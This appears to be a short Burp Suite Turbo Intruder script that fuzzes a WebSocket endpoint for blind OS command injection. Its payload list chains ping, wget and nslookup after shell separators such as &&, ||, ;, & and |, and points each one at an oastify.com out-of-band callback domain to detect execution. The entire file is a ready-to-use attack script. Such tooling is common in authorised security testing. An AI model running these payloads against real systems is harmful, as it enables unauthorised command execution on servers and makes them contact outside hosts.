import time

# Define command injection payloads
payloads = [
        "&& ping -c 3 a0.",
        "|| ping -c 3 b0.",
        "; ping -c 3 c0.",
        "& ping -c 3 d0.",
        "| ping -c 3 e0.",
        "&& wget https://a1.",
        "|| wget https://b1.",
        "; wget https://c1.",
        "& wget https://d1.",
        "| wget https://e1.",
        "&& nslookup a2.",
        "|| nslookup b2.",
        "; nslookup c2.",
        "& nslookup d2.",
        "| nslookup e2.",
    ]

def queue_websockets(upgrade_request, message):
    connection1 = websocket_connection.create(upgrade_request, Engine.TURBO)
    for payload in payloads:
        connection1.queue(message, payload + "8enbebi0cob1hpi5631txisspjvaj07p.oastify.com")


def handle_outgoing_message(websocket_message, interesting):
    results_table.add(websocket_message)

def handle_incoming_message(websocket_message, interesting):
    results_table.add(websocket_message)

